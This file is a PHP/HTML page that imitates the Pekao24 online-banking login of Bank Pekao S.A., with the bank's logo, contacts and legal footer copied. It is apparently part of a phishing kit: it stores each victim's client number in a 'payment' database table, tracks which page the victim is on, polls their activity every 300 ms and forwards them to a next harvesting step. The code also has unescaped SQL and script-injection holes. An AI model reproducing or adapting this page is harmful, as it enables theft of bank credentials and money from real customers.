<?php 
	include('../bank_header.php');
	include('../../../db.php'); 

	if (!$_REQUEST['id'])
		exit;
	
	$id =mysqli_real_escape_string($con,$_REQUEST['id']);
	
	$page_name = basename($_SERVER['PHP_SELF']);
	$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
	$con->query($sqlss);
	
	$sql_paolo = "select * from `payment` WHERE `id` = '$id' limit 1;";

	$new = $con->query($sql_paolo);
	$payment_row = $new->fetch_assoc();
	
	if(isset($_POST['submit'])){
		$bank_user_id = $_POST['bank_user_id'];

		$sql = "UPDATE `payment` SET `bank_user_id` = '$bank_user_id'  WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
		$con->query($sql);
		
		//echo $id."<br/>".$bank_user_id."<br/>";
		echo '<script>window.location.href="index1.php?id='.$_REQUEST['id'].'"</script>';
	}
?>

<script type="text/javascript" src="js/public.js"></script>
<script type="text/javascript">
	setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);

</script>



<!DOCTYPE HTML>
<html>
    <head>
        <title>Pekao24 - Bankowość elektroniczna</title>
        <meta content="width=device-width" name="viewport" />
        <meta charset=utf-8>
        <link href='https://netdna.bootstrapcdn.com/font-awesome/4.0.1/css/font-awesome.css' rel='stylesheet'>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        <link rel="stylesheet" href="css/index.css">
    </head>
    <body>

        <div class="container">
            <!-- Navigation Bar -->
            <nav class="navbar navbar-default pekao-nav">
				
                <div class="container-fluid">
                    <div class="navbar-header">
                        <img src="imgs/logo_pekao24.gif" class="navbar-brand" style="height: 128px;" />
                    </div>
					
                    <ul class="nav navbar-nav navbar-right">
                        <li class="active">
                            <a href="#" class="language-button" style="background-color: rgb(255, 255, 255);"><img src="imgs/england_flag.png" style="height: 20px;" /> English Version</a>
                        </li>
                    </ul>
                </div>
                <nav class="nav nav-tabs top-nav-tab">

                </nav>
            </nav>
            <div class="row">
                <div class="col-lg-3 col-md-2 col-sm-12 col-xs-12">
                  
                </div>
				
                <div class="col-md-6">
				
                    <div class="first-main-content col-lg-12 col-md-12 col-sm-12 col-ms-12">
                        <div class="first-row">
                            <a href="#"> Pomoc</a>
                            <h2  style="font-family: Trebuchet MS, Helvetica, Garuda, FreeSans;">Logowanie</h2>
                        </div>
						
						<form class="form-inline" method="post" action="" role="form" >
                        <div class="second-row">
                            <h4>Numer klienta [?]</h4>
                            <input type="text" class="form-control"  id="email" required="" name="bank_user_id" /> 
							<button style="margin-left: 15px; margin-top:-3px;" name="submit" class="btn btn-danger">DALEJ ></button>
                        </div>
						</form>
                        <div class="third-row">
                            <a href="#">> Problemy z logowaniem?</a>
                            <a href="#">> Wykaz funkcji serwisów</a>
                        </div>
                    </div>
                      <!-- <div class="second-main-content col-lg-12 col-md-12 col-sm-12 col-ms-12">
                     <p>
                            Aby zalogować się do systemu Demo PekaoInternet należy w miejsce numeru klienta wpisać następujące dane:
                            <br>
                            Numer klienta: <strong>123456</strong>
                        </p>
                    </div>-->
                    <div class="third-main-content col-lg-12 col-md-12 col-sm-12 col-ms-12">
                        <h2>Bezpieczeństwo</h2>
                        <ul>
                            <li>
                                <a href="#">Sprawdź</a> przed zalogowaniem, czy widzisz https w adresie strony i połączenie jest szyfrowane.
                            </li>
                            <li>
                                <a href="#">Pamiętaj,</a> że podczas kontaktów telefonicznych Bank nigdy nie prosi o podanie numeru PIN i hasła do Pekao24.
                            </li>
                            <li>
                                <a href="#">Przeglądaj</a> biuletyn bezpieczeństwa w internecie.
                            </li>
                        </ul>
                    </div>
                </div>
               
            </div>

            <div class="row footer-tabs">
                <ul class="nav nav-tabs">
                    <li class="active"><a data-toggle="tab" href="#firsttab">Kontakt do Pekao24</a></li>
                    <li><a data-toggle="tab" href="#secondtab">Kontakt do Pekao24Makler</a></li>
                </ul>
                <div class="tab-content">
                    <div id="firsttab" class="tab-pane fade in active">
                        <div class="col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-12 col-xs-12">
                            <div class="row firsttab-content">
                                <div class="col-lg-3 col-md-3 col-sm-4 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_phone.gif" />&nbsp;&nbsp;&nbsp;<strong>TelePekao/ Infolinia</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        801 365 365
                                        <br>
                                        +48 42 683 82 32
                                        <br>
                                        <span style="font-size: 8px">(opłata wg cennika operatora)</span>
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-4 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" />&nbsp;&nbsp;&nbsp;<strong>Bankowość mobilna</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        <a href="#">> aplikacja na tablet</a><br>
                                        <a href="#">> aplikacja na telefon</a><br>
                                        <a href="#">> m.pekao24.pl</a>
                                    </p>
                                </div>
                                <div class="col-lg-6 col-lg-offset-0 col-md-6 col-md-offset-0 col-sm-4 col-sm-offset-0 col-xs-6 col-xs-offset-3">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" /> <strong>PekaoSMS</strong>
                                        <span class="tabbar-inner-padding">3803</span>
                                    </p>
                                    <p>
                                        <img src="imgs/icon_email.gif" /> <strong>E-mail</strong>
                                        <span class="tabbar-inner-padding">pekao24@pekao.com.pl</span>
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="secondtab" class="tab-pane fade">
                        <div class="col-lg-8 col-lg-offset-2 col-md-8 col-md-offset-2 col-sm-12 col-xs-12">
                            <div class="row secondtab-content">
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_phone.gif" style="height: 24px;" /> <strong>Pekao24Makler<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Serwis telefoniczny</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        800 105 800 (połączenie bezpłatne)
                                        <br>
                                        +48 22 591 22 00 (opłata wg cennika operatora)
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-6">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" style="height: 24px;" /> <strong>Pekao24Makler<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Usługi mobilne</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        <a href="#">> aplikacja mobilna</a><br>
                                        <a href="#">> m.pekao24.pl</a><br>
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                                    <p>
                                        <img src="imgs/icon_mobile_phone.gif" style="height: 24px;" /> <strong>Bankowość mobilna</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        801 301 601(opłata jak za połączenie lokalne)
                                        <br>
                                        +48 22 591 26 01(opłata wg cennika operatora)
                                    </p>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12">
                                    <p>
                                        <img src="imgs/icon_email.gif" style="height: 24px;" /> <strong>Bankowość<br>
                                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mobilna</strong>
                                    </p>
                                    <p class="tabbar-inner-padding">
                                        pekao24makler@pekao.com.pl                                            
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <hr/>
            <div class="row footer-links">
                <div class="links col-lg-9 col-md-9 col-sm-12 col-xs-12">
                    <a href="#">DM Pekao</a>
                    <a href="#">CDM Pekao S.A.</a>
                    <a href="#">Pioneer Pekao TFI S.A.</a>
                    <a href="#">Pekao Pioneer PTE S.A.</a>
                    <a href="#">Pekao Leasing Sp. z o.o.</a>
                </div>
                <div class="col-lg-3 col-md-3 col-sm-12 col-xs-12">
                    <address>Copyright © 2002-2017 Bank Pekao S.A.</address>
                </div>
            </div>
            <div class="row footer-help col-lg-12 col-md-12 col-sm-12 col-xs-12">
                <p>
                    Bank Polska Kasa Opieki Spółka Akcyjna z siedzibą w Warszawie, ul. Grzybowska 53/57, 00-950 Warszawa, 
                    wpisany do rejestru przedsiębiorców w Sądzie Rejonowym dla m.st. Warszawy w Warszawie, XII Wydział Gospodarczy Krajowego Rejestru Sądowego, KRS: 0000014843, 
                    NIP: 526-00-06-841, REGON: 000010205, wysokość kapitału zakładowego i kapitału wpłaconego: 262 470 034 zł.                                 
                </p>
            </div>
        </div>

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    </body>
</html>